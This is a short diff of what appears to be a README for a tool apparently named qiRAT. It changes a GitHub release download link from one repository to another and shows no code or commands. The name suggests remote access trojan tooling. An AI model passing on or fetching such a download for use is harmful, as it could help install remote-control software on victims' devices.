@@ -87,5 +87,5 @@ Please download the .rar file with the name of the application and then extract 
 Download latest version:
 
 ```bash
-https://github.com/rafigk2v9c/APKdevastate/releases/tag/qiRATv1
+https://github.com/rafigk2v9c/qiRAT/releases/tag/qiRATv1
 
